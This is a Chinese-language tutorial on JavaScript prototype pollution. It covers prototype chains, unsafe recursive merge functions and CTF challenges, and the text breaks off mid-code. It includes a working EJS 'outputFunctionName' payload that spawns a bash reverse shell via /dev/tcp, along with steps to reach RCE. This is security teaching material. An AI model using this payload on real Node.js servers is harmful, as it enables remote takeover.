# 写在前面
这个prototype污染是js种独有的安全问题，挺有一14。
在JavaScript发展历史上，很少有真正的私有属性，类的所有属性都允许被公开的访问和修改，包括proto，构造函数和原型。攻击者可以通过注入其他值来覆盖或污染这些proto，构造函数和原型属性。然后，所有继承了被污染原型的对象都会受到影响。原型链污染通常会导致拒绝服务、篡改程序执行流程、导致远程执行代码等漏洞。  
原型链污染的发生主要有两种场景： **不安全的对象递归合并** 和 **按路径定义属性** 。
# 原型链与原型
首先我们要搞清楚这样一件事
> 在JavaScript中 **只有一种结构:对象** ,也就是常说的" **万物皆对象** "。
而每个实例对象都有一个原型对象,而原型对象则引申出其对应的原型对象,经过一层层的链式调用,就构成了我们常说的"原型链"。
每个实例对象（object）都有一个私有属性（ `__proto__`）指向它的 **构造函数的原型对象**
（prototype）。该原型对象也有一个自己的原型对象（ `__proto__`），层层向上直到一个对象的原型对象为 `null`。根据定义，`null`
没有原型，并作为这个原型链中的最后一个环节。
我们可以通过以下方式访问得到某一实例对象的原型对象：
    objectname.[[prototype]]
    objectname.prototype
    objectname["__proto__"]
    objectname.__proto__
    objectname.constructor.prototype
在创建对象时，就会有一些预定义的属性。其中在定义 **函数** 的时候，这个预定义属性就是 prototype，这个 prototype
是一个普通的原型对象。
而定义 **普通的对象** 的时候，就会生成一个 `__proto__`，这个 `__proto__` 指向的是这个对象的构造函数的 prototype。
JavaScript
对象有一个指向一个原型对象的链。当试图访问一个对象的属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及该对象的原型的原型，依次层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾。这条链子就是原型链了。
# 原型链继承
所有类对象在实例化的时候将会拥有`prototype`中的属性和方法，这个特性被用来实现JavaScript中的继承机制。
这里用一个p神的例子
    function Father() {
        this.first_name = 'Donald'
        this.last_name = 'Trump'
    }
    function Son() {
        this.first_name = 'Melania'
    }
    Son.prototype = new Father()
    let son = new Son()
    console.log(`Name: ${son.first_name} ${son.last_name}`)
我们来分析一下这段代码，Son这个函数的原型通过`Son.prototype = new
Father()`这一段代码继承了Father的属性，然后通过构造函数将Son实例化为对象son，当我们输出first_name的时候，引擎会先在构造出对象的函数中寻找，也就是在Son中寻找，找到了Melania并输出，在输出last_name的时候，先在Son中查找，没有找到，然后引擎就会去`son.__proto__`中寻找，通过我们的学习，可以知道`son.__proto__
== Son.prototype`，又因为`Son.prototype = new
Father()`所以Son的圆形中就会有Father的属性，就输出了我们所看到的结果了。
那如果在`son.__proto__`中没找到呢？
如果仍然找不到，则继续在son. **proto**. **proto** 中寻找last_name
依次寻找，直到找到null结束。比如，Object.prototype的 **proto** 就是null
JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。
我们需要记住：
每个构造函数(constructor)都有一个原型对象(prototype)
对象的 **proto** 属性，指向类的原型对象prototype
JavaScript使用prototype链实现继承机制
# JSON语法
为啥要学这个呢？因为我们需要以这种形式对原型链进行传值，来对其进行污染
JSON 语法是 JavaScript 语法的子集。
JSON 语法衍生于 JavaScript 对象标记法语法：
  * 数据在名称/值对中
  * 数据由逗号分隔
  * 花括号容纳对象
  * 方括号容纳数组
JSON键/值对由 **键和值** 组成， **键必须是字符串** ，值可以是字符串（string）、数值(number)
、对象（object）、数组（array）、true、false、null。
在定义JSON键/值时，先是键名，后面写一个冒号，然后是值。如：
    "github": "https://github.com/"
就等价于
    github = "https://github.com/"
再举个例子
    var object = {
      'a': [{ 'b': 2 }, { 'd': 4 }]
    };
    var other = {
      'a': [{ 'c': 3 }, { 'e': 5 }]
    };
    _.merge(object, other);
    // => { 'a': [{ 'b': 2, 'c': 3 }, { 'd': 4, 'e': 5 }] }
# 原型链污染
我们先看一个语句
    object[a][b] = value
我们如果可以控制[a]、[b]和value的值，将[a]设置为`__proto__`，那我们就可以给对象的原型设置一个值为value的b属性了。
这样所有继承object对象原型的实例对象都将会在本身没有b这一属性的情况下，拥有一个值为value的b属性。
举个例子
为啥没在object2中设置foo属性还可以输出Hello World呢？
是因为在第二条语句中，我们对 object1 的原型对象设置了一个 foo 属性，而 object2 和 object1 一样，都是继承了
Object.prototype。在获取 object2.foo 时，由于 object2 本身不存在 foo 属性，就会往父类
Object.prototype 中去寻找。
这就造成了一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。
## Merge 类操作导致原型链污染
哪些情况下我们可以设置`__proto__`的值呢？其实找找能够控制数组（对象）的“键名”的操作即可：
Merge 类操作是最常见可能控制键名的操作，也最能被原型链攻击。
这里还是p神的例子
以对象merge为例，我们想象一个简单的merge函数：
    function merge(target, source) {
        for (let key in source) {
            if (key in source && key in target) {
                merge(target[key], source[key])
            } else {
                target[key] = source[key]
            }
        }
    }
在合并的过程中，存在赋值的操作`target[key] =
source[key]`，那么，这个key如果是`__proto__`，是不是就可以原型链污染呢？
我们用如下代码实验一下：
    let o1 = {}
    let o2 = {a: 1, "__proto__": {b: 2}}
    merge(o1, o2)
    console.log(o1.a, o1.b)
可以看到，数据被合并了，那么验证一下原型链有没有被污染
可以看的出来，并没有。
这是因为，我们用JavaScript创建o2的过程（`let o2 = {a: 1, "__proto__": {b:
2}}`）中，`__proto__`已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是`[a,
b]`，`__proto__`并不是一个key，自然也不会修改Object的原型。
那么，如何让`__proto__`被认为是一个键名呢？
我们将代码改成如下：
    let o1 = {}
    let o2 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
    merge(o1, o2)
    console.log(o1.a, o1.b)
    o3 = {}
    console.log(o3.b)
可见，新建的o3对象，也存在b属性，说明Object已经被污染：
这是因为，JSON解析的情况下，`__proto__`会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。
像这样的一段代码
    function merge(a, b) {
        for (var attr in b) {
            if (isObject(a[attr]) && isObject(b[attr])) {
                merge(a[attr], b[attr]);
            } else {
                a[attr] = b[attr];
            }
        }
        return a
    }
`merge`函数首先迭代第二个对象b上的所有属性(因为在相同的键值对的情况下，第二个对象是优先的)。  
如果属性同时存在于第一个和第二个参数上，并且它们都是`Object`类型，那么`Merge`函数将重新开始合并它。
在这里可以控制`b[attr]`的值，将`attr`设为`__proto__`，也可以控制b中`proto`属性内的值，那当递归时，`a[attr]`在某个点实际上将指向对象a的原型，至此通过递归我们向所有对象添加一个新属性。
需要配合`JSON.parse`使得我们输入的`__proto__`被解析成键名，JSON解析的情况下，`__proto__`会被认为是一个真正的“键名”，而不代表“原型”，否则它只会被当作当前对象的”原型“而不会向上影响
    >let o2 = {a: 1, "__proto__": {b: 2}}
    >merge({}, o2)
    o2.__proto__
    console.log({}.b)
    let o3 = JSON.parse('{"a": 1, "__proto__": {"b": 2}}')
    >merge({},o3)
    console.log({}.b)
     {
        console.log('3000端口');
    });
    //设置ejs:
    app.set('view engine', 'ejs'); //设置模板引擎为ejs
    app.set('views', [`${path.join(__dirname,'moban')}`, `${path.join(__dirname,'views')}`]); //设置模板文件的存放位置
    app.engine('html', require('ejs').__express); //将html文件作为ejs模板文件来解析
但这个模板引擎本身是存在原形污染的，可以直接进行rce，且有大把现成的exp....
    {"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/ip/监听端口 0>&1\"');var __tmp2"}}
先访问/action进行原型链污染，再访问/info进行模板渲染，实现RCE
接着post访问api.js就可以反弹shell了
### 另一道用到了Merge类操作的题目：[HackIM Nullcon CTF 2019] – Proton
    'use strict';
    const express = require('express');
    const bodyParser = require('body-parser')
    const cookieParser = require('cookie-parser');
    const path = require('path');
    const isObject = obj => obj && obj.constructor && obj.constructor === Object;
    function merge(a, b) {
        for (var attr in b) {
            if (isObject(a[attr]) && isObject(b[attr])) {
                merge(a[attr], b[attr]);
            } else {
                a[attr] = b[attr];
            }
        }
        return a
    }
    function clone(a) {
        return merge({}, a);
    }
    // Constants
    const PORT = 8080;
    const HOST = '0.0.0.0';
    const admin = {};
    // App
    const app = express();
    app.use(bodyParser.json())    // 调用中间件解析json
    app.use(cookieParser());
    app.use('/', express.static(path.join(__dirname, 'views')));
    app.post('/signup', (req, res) => {
        var body = JSON.parse(JSON.stringify(req.body));
        var copybody = clone(body)
        if (copybody.name) {
            res.cookie('name', copybody.name).json({
                "done": "cookie set"